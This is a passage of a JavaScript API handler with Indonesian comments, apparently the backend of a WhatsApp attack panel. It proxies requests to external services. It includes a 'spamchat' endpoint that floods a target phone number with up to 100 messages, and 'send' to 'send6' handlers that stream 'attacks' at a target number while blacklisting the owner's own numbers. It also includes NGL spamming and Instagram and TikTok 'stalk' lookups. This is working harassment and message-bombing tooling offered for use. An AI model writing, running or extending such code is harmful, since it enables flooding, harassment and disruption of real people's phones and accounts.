      console.error("[CEKBAN] Proxy error:", err.message);
      return res.status(502).json({
        ok: false,
        error: "Gagal menghubungi server cekban utama",
        creator: config.creator,
      });
    }

    // Langsung teruskan hasil dari backend (JSON murni)
    return res.status(200).json(resp.data);

  } catch (err) {
    console.error("[CEKBAN] Fatal:", err);
    return res.status(500).json({
      ok: false,
      error: err.message || "Gagal memproses permintaan cekban",
      creator: config.creator,
    });
  }
}

// ---------- SENDERS ----------
if (method === "GET" && path.includes("senders")) {
  try {
    const resp = await axios.get(`${base}/status`, axiosOpt);
    const data = resp.data || {};

    // Pastikan clients array valid
    const clients = Array.isArray(data.clients) ? data.clients : [];

    
const senders = clients.map(c => {
  const name = c.name || "unknown";
  const phone = c.phone || "unknown";

  const owner = (c.owner || c.name || "unknown");
  const source = c.source || c.sourceName || "";
  const connected = !!c.connected || (c.status === 'connected');
  const isGlobal = String(owner).toLowerCase() === 'global' || String(source).toLowerCase() === 'telegram' || !!c.isGlobal;
  return {
    name,
    phone,
    owner,
    status: connected ? "connected" : (c.status || "disconnected"),
    isGlobal
  };
});

    return res.status(200).json({
      ok: true,
      senders,
      creator: config.creator
    });
  } catch (err) {
    console.error("[SENDERS] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: "Gagal memuat data sender dari panel",
      creator: config.creator
    });
  }
}

// ---------- TIKTOK DOWNLOADER (proxy ke api-faa) ----------
if (method === "POST" && path.includes("ttdownload")) {
  try {
    // validation origin optional (ikut pola origin check lainnya)
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
      "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({ ok: false, error: `Unauthorized access from ${origin}`, creator: config.creator });
    }

    const body = await parseBody(req);
    const url = (body && body.url) ? String(body.url).trim() : null;
    if (!url) {
      return res.status(400).json({ ok: false, error: "Parameter 'url' wajib diisi", creator: config.creator });
    }

    // call external API
    const apiUrl = `https://api-faa.my.id/faa/tiktok?url=${encodeURIComponent(url)}`;
    let apiResp;
    try {
      apiResp = await axios.get(apiUrl, { timeout: 20000 });
    } catch (err) {
      console.error("[TTDOWN] axios error:", err && err.message);
      return res.status(502).json({ ok: false, error: "Gagal menghubungi layanan downloader", creator: config.creator });
    }

    const bodyResp = apiResp.data || {};
    if (!bodyResp || !bodyResp.status || !bodyResp.result) {
      return res.status(500).json({ ok: false, error: "Response tidak valid dari layanan downloader", raw: bodyResp, creator: config.creator });
    }

    // sukses — teruskan result murni
    return res.status(200).json({
      ok: true,
      result: bodyResp.result,
      creator: config.creator
    });
  } catch (err) {
    console.error("[TTDOWN] Fatal:", err && err.message);
    return res.status(500).json({ ok: false, error: err.message || "Internal server error", creator: config.creator });
  }
}

// ---------- SPAM NGL (proxy) ----------
if (method === "POST" && path.includes("spamngl")) {
  try {
    // origin check (sama pola seperti handler lain)
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
    "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({ ok: false, error: `Unauthorized access from ${origin}`, creator: config.creator });
    }

    const body = await parseBody(req);
    const username = (body.username || body.user || '').toString().trim();
    const message = (body.message || '').toString().trim();
    let count = parseInt(body.count || body.qty || 1, 10) || 1;

    if (!username || !message) {
      return res.status(400).json({ ok: false, error: "Parameter 'username' dan 'message' diperlukan", creator: config.creator });
    }
    // clamp count supaya nggak kelewatan
    if (count < 1) count = 1;
    if (count > 50) count = 50; // batas aman, bisa diubah

    // panggil API eksternal (api.jerexd666...)
    const apiUrl = `https://api.jerexd666.wongireng.my.id/tools/spamngl`;
    let apiResp;
    try {
      apiResp = await axios.get(apiUrl, {
        params: { username, message, count },
        timeout: 20000,
      });
    } catch (err) {
      console.error("[SPAMNGL] axios error:", err && err.message);
      return res.status(502).json({ ok: false, error: "Gagal menghubungi layanan spamngl", creator: config.creator, details: err && err.message });
    }

    const data = apiResp.data || {};
    return res.status(200).json({
      ok: !!data.status,
      raw: data,
      creator: config.creator,
    });
  } catch (err) {
    console.error("[SPAMNGL] error:", err && err.message);
    return res.status(500).json({ ok: false, error: err.message || "Internal server error", creator: config.creator });
  }
}

// ---------- IG STALK (proxy ke api-faa) ----------
if (method === "POST" && path.includes("igstalk")) {
  try {
    // origin check
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
    "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    const body = await parseBody(req);
    const username = (body.username || '').trim();
    if (!username) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'username' wajib diisi",
        creator: config.creator,
      });
    }

    const apiUrl = `https://api-faa.my.id/faa/igstalk?username=${encodeURIComponent(username)}`;
    const apiResp = await axios.get(apiUrl, { timeout: 20000 });

    const data = apiResp.data || {};
    if (!data.status || !data.result) {
      return res.status(500).json({
        ok: false,
        error: "Gagal mengambil data dari API IG Stalk",
        raw: data,
        creator: config.creator,
      });
    }

    return res.status(200).json({
      ok: true,
      result: data.result,
      creator: config.creator,
    });
  } catch (err) {
    console.error("[IGSTALK] error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Internal server error",
      creator: config.creator,
    });
  }
}

/* ============================
   🔐 CREATE ACCOUNT (PROXY)
   ============================ */
if (method === "POST" && path.includes("create-account")) {
  try {
    // --- origin validation (ikut pola endpoint lain) ---
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
      "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));

    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized origin: ${origin}`,
        creator: config.creator,
      });
    }

    // --- Ambil body ---
    const body = await parseBody(req);
    const { username, password, role, expires } = body || {};

    if (!username || !password || !role || !expires) {
      return res.status(400).json({
        ok: false,
        error: "username, password, role, expires wajib diisi",
        creator: config.creator
      });
    }

    // --- Forward ke server utama (wanzdev.js) ---
    let resp;
    try {
      resp = await axios.post(`${base}/create-account`,
        { username, password, role, expires },
        axiosOpt
      );
    } catch (err) {
      console.error("[CREATE-ACCOUNT] Proxy error:", err.message);
      return res.status(502).json({
        ok: false,
        error: "Gagal menghubungi server create-account backend",
        creator: config.creator,
      });
    }

    const data = resp.data || {};

    return res.status(resp.status).json({
      ok: !!data.ok,
      message: data.message || null,
      data: data.data || null,
      error: data.error || null,
      poweredBy: "Wanz Official",
      creator: config.creator,
      raw: data
    });

  } catch (err) {
    console.error("[CREATE-ACCOUNT] Fatal:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Internal server error",
      creator: config.creator
    });
  }
}

// ---------- TIKTOK STALK (proxy ke api-faa) ----------
if (method === "POST" && path.includes("tiktokstalk")) {
  try {
    // origin check
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
    "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    const body = await parseBody(req);
    const username = (body.username || '').trim();
    if (!username) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'username' wajib diisi",
        creator: config.creator,
      });
    }

    const apiUrl = `https://api-faa.my.id/faa/tiktokstalk?username=${encodeURIComponent(username)}`;
    const apiResp = await axios.get(apiUrl, { timeout: 20000 });

    const data = apiResp.data || {};
    if (!data.status || !data.result) {
      return res.status(500).json({
        ok: false,
        error: "Gagal mengambil data dari API TikTok Stalk",
        raw: data,
        creator: config.creator,
      });
    }

    return res.status(200).json({
      ok: true,
      result: data.result,
      creator: config.creator,
    });
  } catch (err) {
    console.error("[TIKTOKSTALK] error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Internal server error",
      creator: config.creator,
    });
  }
}

// ---------- CHECK IP WEBSITE (proxy ke api.jerexd666) ----------
if (method === "POST" && path.includes("checkip")) {
  try {
    // origin check
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
    "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    const body = await parseBody(req);
    const websiteUrl = (body.url || body.website || "").trim();

    if (!websiteUrl) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'url' wajib diisi",
        creator: config.creator,
      });
    }

    const encodedUrl = encodeURIComponent(websiteUrl);
    const apiUrl = `https://api.jerexd666.wongireng.my.id/tools/hostinfo?host=${encodedUrl}`;
    const apiResp = await axios.get(apiUrl, { timeout: 20000 });
    const data = apiResp.data || {};

    if (!data.status || !data.result) {
      return res.status(500).json({
        ok: false,
        error: "Gagal mengambil data IP dari API",
        raw: data,
        creator: config.creator,
      });
    }

    return res.status(200).json({
      ok: true,
      result: data.result,
      creator: config.creator,
    });
  } catch (err) {
    console.error("[CHECKIP] error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Internal server error",
      creator: config.creator,
    });
  }
}

// ---------- IQC (Image Quick Creator) ----------
if (method === "POST" && path.includes("iqc")) {
  try {
    // origin validation
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
    "https://xcvifree.vercel.app",
    
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    const body = await parseBody(req);
    const prompt = (body.prompt || '').trim();
    if (!prompt) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'prompt' wajib diisi",
        creator: config.creator,
      });
    }

    const apiUrl = `https://api-faa.my.id/faa/iqc?prompt=${encodeURIComponent(prompt)}`;
    const apiResp = await axios.get(apiUrl, { timeout: 30000, responseType: 'arraybuffer' });
    const contentType = apiResp.headers['content-type'] || 'image/png';

    res.setHeader('Content-Type', contentType);
    return res.status(200).send(apiResp.data);
  } catch (err) {
    console.error("[IQC] error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Gagal membuat gambar dari IQC API",
      creator: config.creator,
    });
  }
}

// ---------- SPOTIFY SEARCH (proxy ke api-faa) ----------
if (method === "POST" && path.includes("spotify")) {
  try {
    // origin check
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
      "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    const body = await parseBody(req);
    const query = (body.query || body.q || '').trim();
    
    if (!query) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'query' wajib diisi",
        creator: config.creator,
      });
    }

    const apiUrl = `https://api-faa.my.id/faa/spotify-play?q=${encodeURIComponent(query)}`;
    const apiResp = await axios.get(apiUrl, { timeout: 20000 });

    const data = apiResp.data || {};
    if (!data.status || !data.info) {
      return res.status(404).json({
        ok: false,
        error: "Lagu tidak ditemukan",
        creator: config.creator,
      });
    }

    return res.status(200).json({
      ok: true,
      result: data,
      creator: config.creator,
    });
    
  } catch (err) {
    console.error("[SPOTIFY] error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Gagal mencari lagu di Spotify",
      creator: config.creator,
    });
  }
}

// ---------- TOURL UPLOAD (proxy ke Catbox) ----------
if (method === "POST" && path.includes("tourl")) {
  try {
    // origin check
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
      "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    // Handle file upload using formidable
    const form = formidable({
      multiples: false,
      maxFileSize: 10 * 1024 * 1024, // 10MB
    });

    const { files } = await new Promise((resolve, reject) => {
      form.parse(req, (err, fields, files) => {
        if (err) reject(err);
        else resolve({ fields, files });
      });
    });

    const file = files.fileToUpload || files.file;
    if (!file) {
      return res.status(400).json({
        ok: false,
        error: "Tidak ada file yang diupload",
        creator: config.creator,
      });
    }

    // Forward to Catbox
    const formData = new FormData();
    formData.append('fileToUpload', fs.createReadStream(file.filepath));
    formData.append('reqtype', 'fileupload');

    const catboxResponse = await axios.post('https://catbox.moe/user/api.php', formData, {
      headers: {
        'Content-Type': 'multipart/form-data',
      },
      timeout: 30000,
    });

    // Clean up temporary file
    try {
      fs.unlinkSync(file.filepath);
    } catch (e) {
      // Ignore cleanup errors
    }

    if (catboxResponse.status === 200 && catboxResponse.data) {
      return res.status(200).json({
        ok: true,
        url: catboxResponse.data,
        message: "Upload berhasil",
        creator: config.creator,
      });
    } else {
      throw new Error('Upload ke Catbox gagal');
    }

  } catch (err) {
    console.error("[TOURL] error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Upload gagal",
      creator: config.creator,
    });
  }
}

// ====== SPAM CHAT ENDPOINT ======
if (method === "POST" && path.includes("spamchat")) {
  try {
    const body = parseBody(req);
    const { name, phone, to, message, delay = 1000, count = 1 } = body || {};

    if (!name || !phone || !to || !message) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'name', 'phone', 'to', dan 'message' wajib diisi",
        creator: config.creator
      });
    }

    
    const cleanTarget = String(to).replace(/\D/g, "");

    // Validasi jumlah spam
    const spamCount = Math.min(Math.max(1, parseInt(count) || 1), 100);
    const spamDelay = Math.max(500, Math.min(5000, parseInt(delay) || 1000));

    const targetURL = `${base}/spamchat`;
    console.log(`[CONNECT] Streaming ${spamCount}x spam chat ke backend ${targetURL}`);

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 300000);
    const response = await fetch(targetURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        name, 
        phone, 
        to: cleanTarget,
        message,
        delay: spamDelay,
        count: spamCount 
      }),
      signal: controller.signal,
    }).catch((err) => {
      throw new Error(`Gagal menghubungi backend (spamchat): ${err.message}`);
    });
    clearTimeout(timeout);


    if (!response.ok) {
      return res.status(response.status).json({
        ok: false,
        error: `Backend mengembalikan status ${response.status}`,
        creator: config.creator
      });
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder("utf-8");
    let buffer = "";
    let finalData = null;
    let progress = [];

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split("\n");
      buffer = lines.pop();
      for (const line of lines) {
        if (!line.trim()) continue;
        try {
          const json = JSON.parse(line);
          progress.push(json.stage || json.message || json.error);
          if (json.stage === "done" || json.ok === true) finalData = json;
          if (json.stage === "error" || json.ok === false) finalData = json;
        } catch {
          console.warn("[CONNECT] Gagal parse streaming JSON:", line);
        }
      }
    }

    if (buffer.trim()) {
      try {
        const json = JSON.parse(buffer);
        finalData = json;
      } catch (_) {}
    }

    if (!finalData) {
      finalData = { ok: true, message: "Backend selesai tanpa respons final" };
    }

    return res.status(200).json({
      ok: !!finalData.ok,
      name,
      phone,
      to: cleanTarget,
      message,
      delay: spamDelay,
      count: spamCount,
      message: finalData.message || `Selesai ${spamCount}x spam chat`,
      stage: finalData.stage || "done",
      progress,
      error: finalData.error || null,
      creator: config.creator,
      raw: finalData
    });
  } catch (err) {
    console.error(`[CONNECT] Handler error (spamchat):`, err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Internal Server Error",
      creator: config.creator
    });
  }
}



const sendHandler = async (endpoint) => {
  try {
    const body = parseBody(req);
    const { name, phone, to, count = 1 } = body || {}; // Tambahkan count, default 1

    if (!name || !phone || !to) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'name', 'phone', dan 'to' wajib diisi",
        creator: config.creator
      });
    }

    // Validasi jumlah serangan
    const attackCount = Math.min(Math.max(1, parseInt(count) || 1), 100); // Batasi 1-100

    // ==========================
    // 🔒 VALIDASI BLACKLIST NOMOR (sama seperti sebelumnya)
    // ==========================
    const cleanTo = String(to).replace(/\D/g, "");
    const blacklistedNumbers = [  
      "6283898206223",
      "6283873625578",
      "6281528644548",
      "6285770440235",
      "6285134597155",
    ];

    if (blacklistedNumbers.includes(cleanTo)) {
      await notifyOwnerTelegram(`🚫 *Blokir Otomatis*\nUser: ${name}\nPhone: ${phone}\nMencoba target nomor terlarang: ${cleanTo}\nJumlah: ${attackCount}x`);
      return res.status(403).json({
        ok: false,
        error: `Nomor ${cleanTo} tidak dapat dijadikan target. Akses diblokir.`,
        creator: config.creator
      });
    }

    if (cleanTo.length < 8) {
      return res.status(400).json({
        ok: false,
        error: "Nomor target tidak valid",
        creator: config.creator
      });
    }

    const targetURL = `${base}/${endpoint}`;
    console.log(`[CONNECT] Streaming ${attackCount}x serangan ke backend ${targetURL}`);

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 300000);
    const response = await fetch(targetURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, phone, to: cleanTo, count: attackCount }), // Sertakan count
      signal: controller.signal,
    }).catch((err) => {
      throw new Error(`Gagal menghubungi backend (${endpoint}): ${err.message}`);
    });
    clearTimeout(timeout);

    if (!response.ok) {
      return res.status(response.status).json({
        ok: false,
        error: `Backend mengembalikan status ${response.status}`,
        creator: config.creator
      });
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder("utf-8");
    let buffer = "";
    let finalData = null;
    let progress = [];

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split("\n");
      buffer = lines.pop();
      for (const line of lines) {
        if (!line.trim()) continue;
        try {
          const json = JSON.parse(line);
          progress.push(json.stage || json.message || json.error);
          if (json.stage === "done" || json.ok === true) finalData = json;
          if (json.stage === "error" || json.ok === false) finalData = json;
        } catch {
          console.warn("[CONNECT] Gagal parse streaming JSON:", line);
        }
      }
    }

    if (buffer.trim()) {
      try {
        const json = JSON.parse(buffer);
        finalData = json;
      } catch (_) {}
    }

    if (!finalData) {
      finalData = { ok: true, message: "Backend selesai tanpa respons final" };
    }

    return res.status(200).json({
      ok: !!finalData.ok,
      name,
      phone,
      to: cleanTo,
      count: attackCount,
      message: finalData.message || `Selesai ${attackCount}x via ${endpoint}`,
      stage: finalData.stage || "done",
      progress,
      error: finalData.error || null,
      creator: config.creator,
      raw: finalData
    });
  } catch (err) {
    console.error(`[CONNECT] Handler error (${endpoint}):`, err.message);
    return res.status(500).json({
      ok: false,
      error: err.message || "Internal Server Error",
      creator: config.creator
    });
  }
};

if (method === "POST" && path.includes("send6")) return await sendHandler("send6");
if (method === "POST" && path.includes("send5")) return await sendHandler("send5");
if (method === "POST" && path.includes("send4")) return await sendHandler("send4");
if (method === "POST" && path.includes("send3")) return await sendHandler("send3");
if (method === "POST" && path.includes("send2")) return await sendHandler("send2");
if (method === "POST" && path.includes("send"))  return await sendHandler("send");

    // ---------- default ----------
    return res.status(404).json({
      ok: false,
      error: "Endpoint tidak ditemukan",
      hint: "Gunakan ?pair, ?disconnect, ?send, ?send2, ?send3, ?send4, ?login, ?users",
      creator: config.creator,
    });

  } catch (err) {
    console.error("❌ connect.js error:", err && err.message);
    return res.status(500).json({
      ok: false,
      error: err && err.message || "Internal server error",
      creator: config.creator,
    });
  }
}
